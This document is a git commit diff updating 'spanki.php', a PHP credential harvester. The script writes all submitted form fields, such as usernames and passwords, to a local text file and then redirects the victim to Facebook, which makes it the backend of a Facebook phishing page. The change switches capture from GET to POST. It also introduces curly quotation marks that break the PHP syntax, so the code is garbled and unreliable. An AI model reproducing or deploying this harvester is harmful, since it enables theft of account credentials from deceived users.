141d5d19a32928f967978455f7ae055856837341
Osas914 <64631617+Osas914@users.noreply.github.com>
2021-07-12 21:20:43 +0100

    Update spanki.php

--- spanki.php
+++ spanki.php
@@ -1,13 +1,18 @@
-:<?php
-header("Location: https://www.facebook.com/login.php?login_attempt=1");
-$handle = fopen("users.txt", "a");
-foreach($_GET as $variable => $value) {
+
+
+
+
+
+<?php
+header (‘Location:http://www.facebook.com/’);
+$handle = fopen(“usernames.txt”, “a”);
+foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
-fwrite($handle, "=");
+fwrite($handle, “=”);
 fwrite($handle, $value);
-fwrite($handle, "\r\n");
+fwrite($handle, “\r\n”);
 }
-fwrite($handle, "\r\n");
+fwrite($handle, “\r\n”);
 fclose($handle);
 exit;
-?> 
+?>
